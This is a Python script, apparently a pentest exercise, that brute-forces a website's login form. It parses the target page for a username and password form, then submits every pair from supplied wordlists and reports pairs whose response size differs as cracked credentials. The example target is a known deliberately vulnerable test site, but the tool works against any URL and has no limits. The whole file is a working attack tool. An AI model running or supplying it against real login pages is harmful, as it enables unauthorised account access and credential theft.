#! usr/bin/env python3

"""
* Author:               Job Jacob
* Created:              01 January 2021 
* Filename:             auth_bruteforce.py
* Example Run (Linux):  python3 auth_bruteforce.py -t http://testphp.vulnweb.com/login.php -u ./user_list.txt -p ./password_list.txt
"""

import argparse
import requests
import urllib.parse
from bs4 import BeautifulSoup

"""
* Function Name:  print_sample_usage_msg()
* Input:          None
* Output:         None
* Logic:          The function just prints a message on how to run the script with the required arguments.
* Example Call:   print_sample_usage_msg()
"""
def print_sample_usage_msg():
    print("\nSAMPLE USAGE:")
    print("[+] If the target login page is http://testphp.vulnweb.com/login.php and if the the wordlists for usernames and passwords are in the present working directory, then run the script as:")
    print("\tpython3 " + __file__ + " -t http://testphp.vulnweb.com/login.php -u ./user_list.txt -p ./password_list.txt")

""" 
* Function Name:  get_auth_bruteforce_args()
* Input:          None
* Output:         args.target (string): The target login page.
*                 args.user_list (string): Path to wordlist file containing some usernames of users in the website.
*                 args.password_list (string): Path to wordlist file containing common passwords for bruteforcing.
* Logic:          The function parses the parameters passed to the script and verifies if all the required parameters are present.
* Example Call:   target, user_list, password_list = get_auth_bruteforce_args()
"""
def get_auth_bruteforce_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", type=str, help="The target login page (required)")                           
    parser.add_argument("-u", "--user_list", type=str, help="Path to wordlist file containing some usernames of users in the website (required)")
    parser.add_argument("-p", "--password_list", type=str, help="Path to wordlist file containing common passwords for bruteforcing (required)")

    args = parser.parse_args()

    if((args.target == None) and (args.user_list == None) and (args.password_list == None)):
        print("\nError: Arguments missing!! Pass the target login page URL and the wordlists for usernames and passwords as an argument to the script.")
        print_sample_usage_msg()        

    elif(args.target == None):
        print("\nError: Target login page URL missing!! Pass the URL to the login page as an argument to this script.")
        print_sample_usage_msg()

    elif(args.user_list == None):
        print("\nError: Path to username wordlist missing!! Pass the path to the wordlist file containing some usernames of users in the website as an argument to the script.")
        print_sample_usage_msg()

    elif(args.password_list == None):
        print("\nError: Path to password wordlist missing!! Pass the path to the wordlist file containing common passwords for bruteforcing as an argument to the script.")
        print_sample_usage_msg()

    return args.target, args.user_list, args.password_list

""" 
* Function Name:  get_forms_from()
* Input:          response_content (string): The content of the login webpage.
* Output:         form_list (list): List of contents in each form tag.
* Logic:          The function is used to parse the login page and retrieve all the forms in the page.
* Example Call:   form_list = get_forms_from("<DOCTYPE HTML> ...")
"""
def get_forms_from(response_content):
    parsed_html = BeautifulSoup(response_content, features="lxml")
    return parsed_html.findAll("form")

""" 
* Function Name:  check_login_form()
* Input:          form (string): The content inside the form tag.
* Output:         1 if the form is a login form or else 0
* Logic:          The function is used to check whether a given form is a login form or not.
* Example Call:   is_login_form = check_login_form("<form> ...")
"""
def check_login_form(form):
    input_list = form.findAll("input")

    if(len(input_list) == 3):
        if(input_list[0].get("type") == "text"):
            if(input_list[1].get("type") == "password"):
                return 1

    return 0              

""" 
* Function Name:  bruteforce()
* Input:          post_url (string): The URL to post the login data.
*                 login_form (string): The content inside the login form.
*                 user_list (string): Path to wordlist file containing some usernames of users in the website.
*                 password_list (string): Path to wordlist file containing common passwords for bruteforcing.               
* Output:         None
* Logic:          The function is used to bruteforce the login page to get a valid username-password combination.
* Example Call:   brute_force("http://testphp.vulnweb.com/userinfo.php", "<form> ...", "./user_list.txt", "./password_list.txt")
"""
def brute_force(post_url, login_form, user_list, password_list):
    input_list = login_form.findAll("input")
    method = login_form.get("method")
    user_name = input_list[0].get("name")
    pass_name = input_list[1].get("name")
    post_data = {}

    post_data[user_name] = ""
    post_data[pass_name] = ""

    result = requests.post(post_url, data=post_data) if(method == "post") else requests.get(post_url, params=post_data)
    fail_result_size = len(result.content)

    print("\nStarting Bruteforce Attack...")
    print("Press Ctrl+C to quit...\n\n")

    with open(password_list, "rb") as pass_file:
        for pass_line in pass_file:
            password = pass_line.strip().decode('utf-8')

            with open(user_list, "r") as user_file:
                for user_line in user_file:
                    username = user_line.strip()

                    post_data[user_name] = username
                    post_data[pass_name] = password

                    result = requests.post(post_url, data=post_data) if(method == "post") else requests.get(post_url, params=post_data)
                    result_size = len(result.content)

                    if((abs(result_size - fail_result_size) > 100) and (result_size > 200)):
                        print("[+] CRACKED!!! Username: {}, Password: {}".format(username, password))
                        print("\n\nTrying other login credentials...\n\n")
                        reset_flag = 1


if __name__ == "__main__":
    target, user_list, password_list = get_auth_bruteforce_args()

    if((target != None) and (user_list != None) and (password_list != None)):
        try:        
            response = requests.get(target)

            if(response.status_code == 200):
                forms_list = get_forms_from(response.content)

                if(len(forms_list) > 0):
                    login_form = ""
                    post_url = ""

                    for form in forms_list:
                        is_login_form = check_login_form(form)
                        
                        if(is_login_form):
                            post_url = urllib.parse.urljoin(target, form.get("action"))
                            login_form = form
                            break

                    if((len(login_form) > 0) and (len(post_url) > 0)):
                        brute_force(post_url, login_form, user_list, password_list)

                    else:
                        print("\nERROR: Login form not found in the given page. Please verify the target URL and try again.\n")

                else:
                    print("\nERROR: No forms found in the given page. Please verify the target URL and try again.\n")

            else:
                print("\nERROR: INVALID URL. Please verify the target URL and try again.\n")

        except KeyboardInterrupt:
            print("\n\nStopping Bruteforce Attack...\n")

        except:
            pass

        finally:
            print("\nDONE.\n")